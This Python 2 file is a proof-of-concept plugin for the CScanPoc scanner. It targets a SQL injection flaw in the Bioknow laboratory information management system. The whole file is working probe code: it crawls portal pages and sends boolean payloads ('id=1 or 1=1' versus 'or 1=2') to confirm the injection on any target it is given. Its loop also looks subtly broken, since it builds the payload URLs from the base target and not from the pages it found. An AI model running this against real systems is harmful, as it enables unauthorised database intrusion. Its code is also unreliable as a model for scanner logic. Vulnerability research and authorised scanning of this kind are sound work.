# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re

class Vuln(ABVuln):
    vuln_id = 'Bioknow_0002' # 平台漏洞编号，留空
    name = '百奥知实验室综合信息管理系统 SQL注射'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2015-04-14'  # 漏洞公布时间
    desc = '''
        百奥知实验室综合信息管理系统：
        '?id=1%20or%201=1'
        '?id=1%20or%201=2'
        处存在SQL注入漏洞。
    '''  # 漏洞描述
    ref = ''  # 漏洞来源
    cnvd_id = ''  # cnvd漏洞编号
    cve_id = ''  # cve编号
    product = '百奥知实验室综合信息管理系统'  # 漏洞应用名称
    product_version = ''  # 漏洞应用版本

def matchurl(arg):
    hh = hackhttp.hackhttp()
    arg = arg + '/portal/'
    code, head, res, errcode, _ = hh.http(arg)
    m = re.findall('/portal/root/(.*?)/', res)
    m1 = []
    for data in m:
        if data in m1:pass
        else :m1.append(data)
     
    urllist = []  
    for data in m1:
        url = arg + '/root/' + data + '/gg_nr.jsp'
        code, head, res, errcode, _ = hh.http(url)
        if code ==200 :
            urllist.append(url)
    return urllist

class Poc(ABPoc):
    poc_id = '8c13e0a4-666f-4ee5-b620-dcebbfe37780'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-11'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            #refer:http://www.wooyun.org/bugs/wooyun-2010-0107168
            hh = hackhttp.hackhttp()
            arglist = matchurl(self.target)
            for arg in arglist:
                payload1 = '?id=1%20or%201=1'
                payload2 = '?id=1%20or%201=2'
                url1 = self.target + payload1
                url2 = self.target + payload2
                code1, head, res1, errcode, _ = hh.http(url1)
                code2, head, res2, errcode, _ = hh.http(url2)
                m1 = re.search('class="paper"', res1)
                m2 = re.search('class="paper"', res2)

                if code1 == 200 and code2 ==200 and m1 and m2==None:
                    #security_hole(arg +'?id=1'+'  :found sql Injection')
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
